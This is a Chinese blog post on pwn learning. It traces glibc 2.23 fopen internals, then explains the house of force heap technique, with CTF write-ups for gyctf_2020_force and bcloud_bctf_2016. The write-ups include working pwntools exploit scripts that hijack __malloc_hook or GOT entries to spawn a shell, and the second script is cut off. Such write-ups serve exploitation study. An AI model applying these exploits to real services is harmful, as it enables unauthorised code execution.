<h2 id="调试fopen函数"><a href="#调试fopen函数" class="headerlink" title="调试fopen函数"></a>调试fopen函数</h2><p>调试之前的话，可以先看一下整体调用的流程，这样在调试的时候有个参考。另外就是调试的时候，要附加一下源码，关于gdb源码调试环境搭建可以参考我的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">这篇文章</a>。</p>
<p>源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;/home/hacker/Desktop/flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h3 id="整体调用流程图"><a href="#整体调用流程图" class="headerlink" title="整体调用流程图"></a>整体调用流程图</h3><p><img src="/../img/image-20221007215412769.png" alt="image-20221007215412769"></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>刚进入fopen函数的时候，就发现要调用__fopen_internal 函数了（如下图）。然后这里要注意的就是为啥执行的是fopen函数，但一进去就在_IO_new_fopen函数中呢? </p>
<p>原因是这里的宏定义 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_fopen fopen</span></span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007220100510.png" alt="image-20221007220100510"></p>
<h4 id="给新创建的结构体申请一片内存空间"><a href="#给新创建的结构体申请一片内存空间" class="headerlink" title="给新创建的结构体申请一片内存空间"></a>给新创建的结构体申请一片内存空间</h4><p>然后进入__fopen_internal函数后，第一个调用的函数就是malloc来分配了一块locked_FILE结构体大小的内存(如下图)，这个结构体包含了_IO_FILE_plus、_IO_lock_t、_IO_wide_data这三个结构体。由于我们并不调试malloc函数，因此这里我们n过去</p>
<p><img src="/../img/image-20221007215434310.png" alt="image-20221007215434310"></p>
<h4 id="对FILE结构体初始化"><a href="#对FILE结构体初始化" class="headerlink" title="对FILE结构体初始化"></a>对FILE结构体初始化</h4><p>malloc函数执行后，再往下就是_IO_no_init函数(如下图)，我们si进去看看这个函数做了什么</p>
<p><img src="/../img/image-20221007215454681.png" alt="image-20221007215454681"></p>
<p>可以发现调用了这个_IO_old_init函数，我们再次si进去</p>
<p><img src="/../img/image-20221007215520022.png" alt="image-20221007215520022"></p>
<p>发现是在对_IO_FILE_plus结构体进行初始化(如下)</p>
<p><img src="/../img/image-20221007215534954.png" alt="image-20221007215534954"></p>
<p>此时的_IO_FILE_plus结构体中的成员变量如下</p>
<p><img src="/../img/image-20221007215548563.png" alt="image-20221007215548563"></p>
<p>等到_IO_old_init函数执行后，出来继续执行_IO_no_init函数，发现在对_IO_wide_data结构体中的成员变量进行初始化，因此得出结论_IO_no_init函数就是在进行着结构体的初始化工作</p>
<p><img src="/../img/image-20221007215605749.png" alt="image-20221007215605749"></p>
<h4 id="将-IO-FILE-plus结构体链入-IO-list-all链表"><a href="#将-IO-FILE-plus结构体链入-IO-list-all链表" class="headerlink" title="将_IO_FILE_plus结构体链入_IO_list_all链表"></a>将_IO_FILE_plus结构体链入_IO_list_all链表</h4><p>等到_IO_no_init函数出来后，就调用了_IO_file_init函数</p>
<p><img src="/../img/image-20221007215627273.png" alt="image-20221007215627273"></p>
<p>可以发现其实_IO_file_init函数主要是对_IO_link_in函数的一个封装，而_IO_link_in函数听名字就感觉是进行的链入操作,si进去看看</p>
<p><img src="/../img/image-20221007215640763.png" alt="image-20221007215640763"></p>
<p>这部分主要的代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure>

<p>很明显这里就把fp(也就是结构体_IO_FILE_plus)给链入了链表中</p>
<p><img src="/../img/image-20221007215652819.png" alt="image-20221007215652819"></p>
<p>下面两个图片分别是将fp链入前后的情况</p>
<p><img src="/../img/image-20221007215705984.png" alt="image-20221007215705984"></p>
<p><img src="/../img/image-20221007215718666.png" alt="image-20221007215718666"></p>
<p>链入前后整个链表对应的情况如下：</p>
<p><img src="/../img/image-20221007215732445.png" alt="image-20221007215732445"></p>
<h4 id="执行open系统调用来打开文件"><a href="#执行open系统调用来打开文件" class="headerlink" title="执行open系统调用来打开文件"></a>执行open系统调用来打开文件</h4><p>当_IO_file_init 函数执行完后，就来到了fopen函数的核心部分，将要调用_IO_file_fopen函数(如下)</p>
<p><img src="/../img/image-20221007215749092.png" alt="image-20221007215749092"></p>
<p>进入_IO_file_fopen函数后，发现先fopen函数的mode参数(文件的打开方式)进行了处理</p>
<p><img src="/../img/image-20221007215801237.png" alt="image-20221007215801237"></p>
<p>而后调用了_IO_file_open函数(这里就不再放图片说明了)，然后si进去，该函数又调用了open64函数，再次si进去执行了open系统调用</p>
<p><img src="/../img/image-20221007215812651.png" alt="image-20221007215812651"></p>
<p>然后这里将sys_open执行后的文件描述符赋值给fp-&gt;fileno(如下图)</p>
<p><img src="/../img/image-20221007215826367.png" alt="image-20221007215826367"></p>
<p>至此fopen函数的整个流程可以说是接近尾声了，最后再次调用了_IO_link_in函数，确保fp已经链入了链表中(如果发现链入后，那么_IO_link_in函数将直接退出)。(如下图)</p>
<p><img src="/../img/image-20221007215838094.png" alt="image-20221007215838094"></p>
<p><img src="/../img/image-20221007215850109.png" alt="image-20221007215850109"></p>
<p>至此fopen函数结束，此时的FILE结构体如下</p>
<p><img src="/../img/image-20221007215905013.png" alt="image-20221007215905013"></p>
<h3 id="总结fopen调用流程"><a href="#总结fopen调用流程" class="headerlink" title="总结fopen调用流程"></a>总结fopen调用流程</h3><p>将整个fopen函数的调用流程概括一下为:</p>
<blockquote>
<p>1、给新创建的结构体申请一片内存空间</p>
<p>2、对FILE结构体初始化</p>
<p>3、将_IO_FILE_plus结构体链入_IO_list_all链表</p>
<p>4、执行open系统调用来打开文件</p>
</blockquote>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://la13x.github.io/2021/07/27/IO-FILE/#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">IO_FILE相关利用 | Alex’s blog~ (la13x.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://nightrainy.github.io/2019/08/03/IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%A9%E7%94%A8/">_IO_FILE结构体利用 - 知世の小屋 (nightrainy.github.io)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/177910">IO FILE之fopen详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/113845320">(41条消息) 好好说话之IO_FILE利用（1）：利用_IO_2_1_stdout泄露libc_hollk的博客-CSDN博客_stdout泄露libc</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hawkJW/p/13546416.html">pwn——IO_FILE学习（一） - hawkJW - 博客园 (cnblogs.com)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/73595adc.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/73595adc.html" class="post-title-link" itemprop="url">关于house of force的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:49:11" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>house of force是针对top chunk的一种手法，通过这种攻击手法，可以将top chunk更新到任意内存，再次申请堆块并写入数据，这就相当于任意地址任意写了。</p>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>在<strong>2.23和2.27</strong>的libc版本中，由于<strong>没有对top chunk的size合法性进行检查</strong>，因此如果我们能够<strong>控制top chunk的size位</strong>以及<strong>malloc在申请堆块时的大小不受限制</strong>，那么就可以完成该攻击。</p>
<p>先从malloc函数源码看起，如果malloc函数执行时发现没有任何的bins中的堆块能够满足需求，就会从top chunk中切下一块内存返回给malloc**(前提是top chunk能够有这么多内存供切割)**</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;<span class="comment">//获取当前top chunk的地址</span></span><br><span class="line">size = chunksize (victim);<span class="comment">//计算top chunk的大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line"><span class="comment">//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20</span></span><br><span class="line"><span class="comment">//如果top chunk的大小大于nb(程序执行malloc需要分配的内存大小)</span></span><br><span class="line"><span class="comment">//加上MINSIZE的大小，就从top chunk中来切一块内存</span></span><br><span class="line"><span class="comment">//之所以要加上MINSIZE是要保证切割后剩余的内存要是一个完整的堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">//remainder_size为切割后的剩余大小</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb);<span class="comment">//remainder为切割前top chunk+nb的值，也就是切割后top chunk的地址</span></span><br><span class="line">    av-&gt;top = remainder;<span class="comment">//更新top chunk</span></span><br><span class="line">    <span class="comment">//下面两个set_head给切割出去的堆块以及切割后的top chunk设置新的size</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);<span class="comment">//调试用的，这里没用</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//返回用户指针</span></span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>漏洞的利用在这一行代码<code>remainder = chunk_at_offset (victim, nb)</code> 如果我们可以控制nb的值，其实就可以控制remainder的值了(remainder就是切割后的top chunk的地址)，这个手法最终的效果就是精准控制切割后top chunk的地址。</p>
<h2 id="探究一下如何控制top-chunk的地址"><a href="#探究一下如何控制top-chunk的地址" class="headerlink" title="探究一下如何控制top_chunk的地址"></a>探究一下如何控制top_chunk的地址</h2><p>下面我们深入分析一下上面那个式子，来探究一下如何精准控制top chunk的地址。</p>
<p>首先<code>remainder = chunk_at_offset (victim, nb)</code>等价于下面这个式子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim+nb=top_chunk</span><br></pre></td></tr></table></figure>

<blockquote>
<p>victim为切割前的top chunk header地址<br>nb为实际要申请的内存大小<br>top_chunk为切割后的top chunk header的地址</p>
</blockquote>
<p>然后将nb和top_chunk再具体展开一下(解释在代码的下面)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nb=request_size+0x10</span><br><span class="line">top_chunk+0x10=target_addr</span><br></pre></td></tr></table></figure>

<blockquote>
<p>nb 也等于我们malloc时的内存大小(requset_size)，再加上一个0x10的chunk头<br>target_addr先假设是篡改top chunk后的地址<br>house of force的核心就是篡改top chunk的地址，而我们的数据自然是只能输入到用户区，因此我们需要让top chunk+0x10后才能保证target_addr是位于了篡改后chunk的用户区</p>
</blockquote>
<p>将上面两部分整合一下，即为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim+request_size+0x10=target_addr-0x10</span><br></pre></td></tr></table></figure>

<p>最终整理一下为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request_size=target_addr-0x20-victim</span><br></pre></td></tr></table></figure>

<p>叙述一下这个式子就是我们 <strong>所申请的内存大小等于想要将top chunk篡改到的地址减去top chunk原本的地址再减去0x20</strong> <u>（32位程序是-0x10，原理一样，只不过原本0x8的内存单元变成了0x4，所以最终的值减半）</u></p>
<h2 id="house-of-force中对top-chunk的size进行的检查"><a href="#house-of-force中对top-chunk的size进行的检查" class="headerlink" title="house of force中对top chunk的size进行的检查"></a>house of force中对top chunk的size进行的检查</h2><p>此时我们执行malloc(request_size)，就可以将top chunk更新到指定的地址了么?</p>
<blockquote>
<p>不可以。别忘了存在一个检查<code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>通常来说我们这个request_size是个负数，强转为无符号整数进行判断时，request_size肯定为一个超大的数值，如果top chunk本身的size是正常的话，必然无法满足这个要求，因此house of force的一个条件就是可以控制top chunk的size位(通常都是通过溢出的方式)，将其size设置为-1，-1是转换成无符号整数时，将变成最大的数字0xffffffffffffffff，无论request_size为多大都可以通过if检查了。</p>
</blockquote>
<p>将top chunk的size改为0xffffffffffffffff后，再执行malloc(request_size)，即可将top chunk更新到我们指定的地址，然后再次malloc时即可将该内存申请出来，并写入数据。上述内容就是house of force的攻击过程了。</p>
<h2 id="house-of-force手法总结"><a href="#house-of-force手法总结" class="headerlink" title="house of force手法总结"></a>house of force手法总结</h2><blockquote>
<p>适用libc版本:2.23 2.27</p>
<p>使用前提:</p>
<p>1、申请堆块的大小不受限制</p>
<p>2、能够篡改top chunk的size位(主要是通过溢出的手段)</p>
<p>3、有top chunk原本的地址(这一条在特殊情况下，可以不具备)</p>
<p>4、有将top chunk更新后的目的地址(这一条在特殊情况下，可以不具备)</p>
<p>PS：特殊情况为：我们只需要top chunk的地址更新到堆区，这样我们只需要知道top chunk和目的地址二者的偏移即可。(因为本身其实算request_size的时候要的就是二者偏移)(相关题目可以看hitcontraining_bamboobox)</p>
<p>攻击效果：可以将top chunk更新到任意已知地址，再将新的堆块从top chunk中申请出来写入数据。就可以达到任意地址任意写的目的。</p>
<p>防御措施：对top chunk的size位进行检查，判断是否合法</p>
</blockquote>
<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007212605409.png" alt="image-20221007212605409"></p>
<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p><img src="/../img/image-20221007212736745.png" alt="image-20221007212736745"></p>
<p>简单分析一下程序就会发现，这道题只有一个功能，就是add函数。</p>
<h3 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="/../img/image-20221007212804763.png"></p>
<p>首先是malloc申请的内存大小无检查。</p>
<p><img src="/../img/image-20221007212810461.png" alt="image-20221007212810461"></p>
<p>然后printf会打印出来申请的堆地址，最后就是不管malloc申请的内存多大，都可以输入0x50字节的内容，因此这里存在溢出(伪代码看的话这个*v0和*i没关系，但是看汇编的话就会发现这俩是一个东西，估计是转伪代码的时候出问题了吧)</p>
<h3 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h3><p>因为这道题没有free函数，就一个add函数，因此很多手法都是失效了。但是因为这几个漏洞点正好符合house of force攻击的条件。所以就用house of force嘎嘎打了。</p>
<p>1、先申请一块超大内存，利用mmap映射后与libc基地址存在的固定偏移，来拿到libc基地址。</p>
<p>2、将top chunk的size位修改为-1</p>
<p>3、精心构造出申请chunk的大小，保证从top chunk中切下来后，让top chunk位于malloc_hook(其实应该位于realloc_hook上的，因为要用realloc来调整栈帧，不过这就是后话了)</p>
<p>4、申请堆块，将malloc_hook从top chunk中申请出来，然后写入one_gadget。</p>
<p>5、发现所有one_gadget都打不通，只能用realloc调整栈帧再打one_gadget</p>
<blockquote>
<p>然后我主要提三个点做一下相关解释吧:</p>
<p>1、为什么其他师傅都申请的是0x200000大小的堆块？</p>
<p>2、精心构造chunk大小，让top chunk位于malloc_hook上，这个chunk大小是怎么算的？</p>
<p>3、最后realloc+4是怎么调试出来的?</p>
</blockquote>
<h3 id="1、为什么其他师傅都申请的是0x200000大小的堆块？"><a href="#1、为什么其他师傅都申请的是0x200000大小的堆块？" class="headerlink" title="1、为什么其他师傅都申请的是0x200000大小的堆块？"></a>1、为什么其他师傅都申请的是0x200000大小的堆块？</h3><p>如果大家这里尝试过mmap映射内存大小是几万字节或者十几万字节的话，应该会发现，本地能打通，但是远程打不通这个情况。</p>
<p><strong>导致了这个情况的原因是因为申请的堆块地址位于了ld中</strong>(请参考下图 )如果环境一样的情况下，libc和ld直接的固定偏移是可以直接用的，就是说你本地的环境如果和远程的环境一样的话(这个环境相同指的并不是libc相同)，你拿ld与libc的固定偏移，打远程也是ok的。但是如果本地和远程环境不一样，结果就是你本地用ld和libc的那个偏移能打通，但是到远程还用这个偏移拿到的就不是libc正确的基地址了。</p>
<p><img src="/../img/image-20221007212827121.png"></p>
<p>经过我不断调试，发现当申请0x1FBFE9大小以上的时候，mmap映射的内存才会到libc区域。(最大是多少，我没有试)</p>
<p>所以说这里未必非要是申请0x200000大小的堆块，只要大于等于0x1fbfe9就行。这样申请出来的堆块地址就和libc基地址存在固定偏移了(如下图)</p>
<p><img src="/../img/image-20221007212919863.png" alt="image-20221007212919863"></p>
<h3 id="2、申请的size为多少，才能让top-chunk位于malloc-hook上？"><a href="#2、申请的size为多少，才能让top-chunk位于malloc-hook上？" class="headerlink" title="2、申请的size为多少，才能让top chunk位于malloc_hook上？"></a>2、申请的size为多少，才能让top chunk位于malloc_hook上？</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request_size=target_addr-0x20-victim</span><br></pre></td></tr></table></figure>

<p>直接套这个式子，解释在文章最开始。</p>
<p>都不用算出来，脚本直接这样写即可。</p>
<p><img src="/../img/image-20221007212926940.png"></p>
<p><strong>这里多减了0x10的原因是因为，我将top chunk的地址篡改为了realloc_hook-8的位置。因为要连着realloc_hook和malloc_hook一起修改了,调整栈帧打one_gadget。</strong></p>
<h3 id="3、realloc-4是怎么调试出来的"><a href="#3、realloc-4是怎么调试出来的" class="headerlink" title="3、realloc+4是怎么调试出来的?"></a>3、realloc+4是怎么调试出来的?</h3><p>这个咋调试的话，本文就不具体说明了。主要会的师傅不需要解释，不会的师傅需要仔细解释说明。所以需要弄懂realloc+4咋调试出来的师傅 可以看我这篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16421631.html#_label3">文章</a>  仔细看完之后，保证嘎嘎会。如果对我写的哪里有疑问，可以一起交流一下。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;bin addr &#x27;</span>)</span><br><span class="line">    heap_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> heap_addr</span><br><span class="line"></span><br><span class="line">leak_libc_addr=add(<span class="number">0x210000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr+<span class="number">0x210ff0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4526a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">leak_heap_addr=add(<span class="number">0x10</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">top_chunk_addr=leak_heap_addr+<span class="number">0x10</span></span><br><span class="line">log_addr(<span class="string">&#x27;top_chunk_addr&#x27;</span>)</span><br><span class="line">realloc_addr=libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]+libc_base_addr</span><br><span class="line">malloc_hook=libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]+libc_base_addr</span><br><span class="line">log_addr(<span class="string">&#x27;malloc_hook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add((malloc_hook-<span class="number">0x20</span>-top_chunk_addr-<span class="number">0x10</span>),<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;bbbbbbbb&#x27;</span>+p64(one_gadget)+p64(realloc_addr+<span class="number">4</span>))</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0xCCB,0xAF9)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;size\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007212940793.png" alt="image-20221007212940793"></p>
<h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007212946708.png" alt="image-20221007212946708"></p>
<h3 id="漏洞所在：-1"><a href="#漏洞所在：-1" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><h4 id="堆地址的泄露"><a href="#堆地址的泄露" class="headerlink" title="堆地址的泄露"></a>堆地址的泄露</h4><p><img src="/../img/image-20221007212955450.png" alt="image-20221007212955450"></p>
<p>这里乍一看malloc(0x40),input 0x40的数据似乎不存在溢出，但因为strcpy函数的存在，所以这里的溢出是必然的。我们直接将0x40个数据输满，然后调一下(如下图)。</p>
<p><img src="/../img/image-20221007213007064.png" alt="image-20221007213007064"></p>
<p>(上图是即将拷贝，之前strcpy函数前的栈空间)strcpy函数会将红色框部分的数据以及一个\x00全部拷贝到刚申请的0x40的堆块中，会发现此时拷贝的数据溢出了末尾的堆地址以及一个\x00。溢出原因是因为strcpy函数遇到\x00或者\x0a才会停止，而输入的数据将原本栈中的\x00给覆盖掉了，就导致多拷贝了一个地址，然后拷贝结束strcpy函数会加上一个\x00。</p>
<p>下图为拷贝后的堆布局，可以发现拷贝后造成了溢出。</p>
<p><img src="/../img/image-20221007213014472.png" alt="image-20221007213014472"></p>
<p>接下来再执行printf函数的时候就将这个溢出的堆地址泄露出来了。</p>
<p><img src="/../img/image-20221007213022094.png" alt="image-20221007213022094"></p>
<h4 id="strcpy导致堆溢出"><a href="#strcpy导致堆溢出" class="headerlink" title="strcpy导致堆溢出"></a>strcpy导致堆溢出</h4><p>有了上面的溢出情况后，我们如法炮制，在这里依旧将两次的输入写满，看看会不会也出现溢出的情况</p>
<p>观察下图发现，确实又发生了溢出，而溢出的原因与上面堆地址泄露那个溢出原因一样，也是因为栈里没有出现\x00将strcpy函数截断，导致strcpy拷贝时发生了溢出。</p>
<p><img src="/../img/image-20221007213200865.png" alt="image-20221007213200865"></p>
<p>这就说明我们可以现在可以控制top chunk的大小，知道top chunk的地址，malloc申请堆块大小时不受限制，因此选择house of force attack。</p>
<h3 id="大致思路：-1"><a href="#大致思路：-1" class="headerlink" title="大致思路："></a>大致思路：</h3><p>1、利用strcpy函数的溢出配合%s来泄露堆地址，再利用strcpy函数溢出来修改top chunk的size为0xffffffff。</p>
<p>2、利用house of force将top chunk位置改到bss段指针数组的位置</p>
<p>3、篡改bss段存储chunk地址的指针数组为free的got地址和puts的got地址</p>
<p>4、用edit将free的got表改为puts的plt表</p>
<p>5、free存储在bss段上的puts的got地址，由此来泄露libc地址</p>
<p>6、将free的got地址改为system地址，然后free掉存有&#x2F;bin&#x2F;sh字符串的地址即可获取shell</p>
<h3 id="篡改free-got表的一个坑"><a href="#篡改free-got表的一个坑" class="headerlink" title="篡改free got表的一个坑"></a>篡改free got表的一个坑</h3><p>整体利用过程还是比较简单的，就不再赘述了。主要记录一下篡改free函数got表时的一个坑。</p>
<p>由于此时我们已经将top chunk的地址进行了修改，而此时top chunk的size为<img src="/../img/image-20221007213214848.png"></p>
<p>上图的这个size不是固定不变的，跟top chunk的地址有关系，不过这个size肯定是一个负数(这里展示的是补码)</p>
<p>这个size记录的是 id为0的chunk大小。</p>
<p>然后在edit函数里面有一个检查(如下)</p>
<p><img src="/../img/image-20221007213222656.png" alt="image-20221007213222656"></p>
<p>i初始值为0，但是a2(就是size)为负数，也就是说这里我们的数据是写不进去的。</p>
<p>所以我们需要将函数的got地址布置到id为0之后的chunk地址才行，否则无法对其进行编辑。</p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc32.so&#x27;</span>)</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26687</span>)</span><br><span class="line">c_a=<span class="number">0x08048D11</span></span><br><span class="line">c_d=<span class="number">0x08048D26</span></span><br><span class="line">c_e=<span class="number">0x08048D1F</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the length of the note content:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Create success&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    